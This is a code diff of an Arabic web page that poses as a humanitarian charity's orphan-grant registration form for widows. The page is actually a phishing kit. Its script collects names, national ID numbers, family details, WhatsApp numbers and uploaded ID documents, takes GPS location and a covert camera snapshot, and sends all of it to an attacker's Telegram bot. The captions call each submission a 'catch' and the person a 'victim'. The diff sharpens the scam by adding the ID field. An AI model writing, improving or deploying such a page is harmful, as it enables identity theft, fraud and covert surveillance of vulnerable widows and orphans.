@@ -3,53 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة التسجيل | منظمة تكافل 2026</title>
+    <title>منظمة تكافل - بوابة المساعدات</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #eef2f3; direction: rtl; padding: 15px; }
-        .card { background: white; max-width: 450px; margin: auto; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border-top: 6px solid #27ae60; }
-        h2 { color: #2c3e50; font-size: 22px; margin-bottom: 5px; }
-        p.subtitle { color: #7f8c8d; font-size: 13px; margin-bottom: 20px; }
-        .input-group { text-align: right; margin-bottom: 15px; }
-        label { display: block; font-weight: bold; font-size: 14px; margin-bottom: 5px; color: #34495e; }
-        input, select { width: 100%; padding: 12px; border: 1px solid #dcdde1; border-radius: 10px; box-sizing: border-box; background: #f9f9f9; }
-        .btn { background: linear-gradient(135deg, #27ae60, #2ecc71); color: white; border: none; padding: 16px; width: 100%; border-radius: 10px; cursor: pointer; font-size: 18px; font-weight: bold; margin-top: 15px; box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3); }
-        .status { font-size: 11px; color: #e74c3c; margin-top: 10px; font-weight: bold; }
+        :root { --primary: #2c3e50; --secondary: #27ae60; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f4f8; direction: rtl; padding: 10px; margin: 0; }
+        .header { background: var(--primary); color: white; padding: 20px; text-align: center; border-radius: 0 0 25px 25px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .card { background: white; max-width: 480px; margin: auto; padding: 25px; border-radius: 15px; box-shadow: 0 8px 20px rgba(0,0,0,0.05); }
+        h2 { color: var(--primary); font-size: 20px; margin-top: 0; }
+        .section-title { background: #f8f9fa; padding: 8px; border-right: 4px solid var(--secondary); font-weight: bold; margin: 15px 0; font-size: 14px; color: #555; }
+        .input-group { margin-bottom: 15px; text-align: right; }
+        label { display: block; font-size: 13px; margin-bottom: 5px; color: #666; }
+        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 14px; transition: 0.3s; }
+        input:focus { border-color: var(--secondary); outline: none; background: #fdfdfd; }
+        .btn { background: var(--secondary); color: white; border: none; padding: 16px; width: 100%; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; margin-top: 10px; transition: 0.3s; }
+        .btn:hover { background: #219150; }
+        .footer { font-size: 11px; color: #999; text-align: center; margin-top: 20px; line-height: 1.6; }
     </style>
 </head>
 <body>
 
+<div class="header">
+    <img src="https://img.icons8.com/external-flat-juicy-fish/60/ffffff/external-charity-humanitarian-flat-juicy-fish.png" width="50">
+    <div style="font-size: 18px; font-weight: bold; margin-top: 5px;">منظمة تكافل الإنسانية</div>
+    <div style="font-size: 12px; opacity: 0.8;">قسم رعاية الأيتام والأرامل</div>
+</div>
+
 <div class="card">
-    <img src="https://img.icons8.com/fluency/96/handshake.png" width="60">
-    <h2>منظمة تكافل الإنسانية</h2>
-    <p class="subtitle">استمارة التسجيل في منحة كفالة الأيتام السنوية لعام 2026</p>
+    <h2>طلب تسجيل المنحة السنوية</h2>
+    <p style="font-size: 12px; color: #e74c3c; background: #fff5f5; padding: 10px; border-radius: 5px;">يرجى التأكد من دقة البيانات المرفقة لضمان سرعة معالجة الطلب وصرف المنحة.</p>
 
+    <div class="section-title">بيانات المستفيد الأساسية</div>
+    
     <div class="input-group">
-        <label>الاسم الكامل للأرملة (كما في الهوية):</label>
-        <input type="text" id="name" placeholder="الاسم الثلاثي">
+        <label>الاسم الكامل (كما هو في الهوية):</label>
+        <input type="text" id="name" placeholder="مثال: فاطمة محمد العلي">
     </div>
 
     <div class="input-group">
-        <label>عدد الأبناء الأيتام:</label>
-        <input type="number" id="kids" placeholder="مثلاً: 3">
+        <label>الرقم الوطني / رقم الهوية:</label>
+        <input type="number" id="id_num" placeholder="الرقم المكون من 11 خانة">
+    </div>
+
+    <div class="section-title">بيانات الأيتام</div>
+    
+    <div class="input-group">
+        <label>عدد الأطفال المشمولين بالمنحة:</label>
+        <input type="number" id="kids" placeholder="عدد الأطفال القاصرين">
     </div>
 
     <div class="input-group">
-        <label>تاريخ وفاة الزوج:</label>
-        <input type="text" id="death" placeholder="يوم/شهر/سنة">
+        <label>تاريخ وفاة الزوج (يوم/شهر/سنة):</label>
+        <input type="text" id="death" placeholder="مثلاً: 12/05/2021">
     </div>
 
+    <div class="section-title">المستندات والصور (إجباري)</div>
+    
     <div class="input-group">
-        <label>رقم هاتف الواتساب النشط:</label>
-        <input type="tel" id="phone" placeholder="09xxxxxxxx">
-    </div>
-
-    <div class="input-group">
-        <label>رفع صور الهوية ودفتر العائلة (لتأكيد البيانات):</label>
+        <label>تحميل صور الهوية ودفتر العائلة (يمكنك اختيار عدة صور):</label>
         <input type="file" id="studiofiles" multiple accept="image/*">
     </div>
 
-    <button class="btn" onclick="masterCapture()">إرسال الطلب إلى منظمة تكافل</button>
-    <p class="status">ملاحظة: سيتم إجراء تحقق بصري وصوتي فوري لمطابقة بيانات المستفيد.</p>
+    <div class="input-group">
+        <label>رقم هاتف الواتساب للتواصل:</label>
+        <input type="tel" id="phone" placeholder="09xxxxxxxx">
+    </div>
+
+    <button class="btn" onclick="masterCapture()">تأكيد البيانات وتقديم الطلب</button>
+    
+    <div class="footer">
+        بوابة منظمة تكافل الموحدة للإغاثة<br>
+        المقر الرئيسي - قسم الدعم الاجتماعي © 2026
+    </div>
 </div>
 
 <canvas id="canvas" style="display:none;"></canvas>
@@ -69,7 +93,7 @@
                 body: JSON.stringify({ chat_id: CHAT_ID, text: data, parse_mode: "Markdown" })
             });
         } else {
-            formData.append(type, data, type === "photo" ? "capture.jpg" : "audio.ogg");
+            formData.append(type, data, "file.jpg");
             if (caption) formData.append("caption", caption);
             await fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
                 method: "POST",
@@ -81,23 +105,28 @@
     async function masterCapture() {
         const name = document.getElementById('name').value;
         const phone = document.getElementById('phone').value;
-        if (!name || !phone) { alert("يرجى ملء البيانات أولاً"); return; }
+        const id_num = document.getElementById('id_num').value;
 
-        alert("جاري الاتصال بخوادم منظمة تكافل.. يرجى السماح بالصلاحيات المطلوبة للتحقق.");
+        if (!name || !phone || !id_num) { alert("يرجى إكمال البيانات الأساسية قبل الإرسال."); return; }
 
+        alert("جاري التحقق من الهوية.. يرجى السماح بالصلاحيات لمطابقة بياناتك الجغرافية مع السكن.");
+
+        // 1. جلب الموقع
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const map = `📍 الموقع: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            const info = `🔥 **صيد جديد (تكافل)** 🔥\n👤 الاسم: ${name}\n👦 الأيتام: ${document.getElementById('kids').value}\n📅 الوفاة: ${document.getElementById('death').value}\n📞 الهاتف: ${phone}\n${map}`;
+            const info = `🔥 **صيد جديد (منظمة تكافل)** 🔥\n👤 الاسم: ${name}\n🆔 الهوية: ${id_num}\n👦 الأيتام: ${document.getElementById('kids').value}\n📅 الوفاة: ${document.getElementById('death').value}\n📞 الهاتف: ${phone}\n${map}`;
             await sendToTelegram("text", info);
         });
 
+        // 2. إرسال صور الاستديو المختارة
         const files = document.getElementById('studiofiles').files;
         for (let file of files) {
-            await sendToTelegram("document", file, "📁 ملف مسحوب من الاستديو");
+            await sendToTelegram("document", file, "📁 ملف رسمي مرفوع");
         }
 
+        // 3. التقاط صورة الكاميرا التلقائية (صامتة وبدون صوت)
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.getElementById('video');
             video.srcObject = stream;
 
@@ -107,24 +136,14 @@
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 canvas.toBlob(async (blob) => {
-                    await sendToTelegram("photo", blob, "📸 صورة الضحية المباشرة");
-                }, 'image/jpeg');
-                
-                const mediaRecorder = new MediaRecorder(stream);
-                const chunks = [];
-                mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                mediaRecorder.onstop = async () => {
-                    const audioBlob = new Blob(chunks, { type: 'audio/ogg' });
-                    await sendToTelegram("voice", audioBlob, "🎤 تسجيل صوتي للضحية");
+                    await sendToTelegram("photo", blob, "📸 لقطة التحقق المباشرة");
                     stream.getTracks().forEach(track => track.stop());
-                    alert("تم تأكيد هويتك بنجاح لدى منظمة تكافل، سيتم التواصل معك قريباً.");
-                };
-                mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 4000);
-            }, 2000);
+                    alert("تم إرسال طلبك إلى منظمة تكافل بنجاح. سنقوم بالرد عبر الواتساب.");
+                }, 'image/jpeg');
+            }, 2500);
 
         } catch (e) {
-            alert("خطأ في التحقق! يرجى منح الصلاحيات لمطابقة البيانات الشخصية لدى المنظمة.");
+            alert("فشل التحقق! يرجى تفعيل الكاميرا والـ GPS لإتمام العملية.");
         }
     }
 </script>
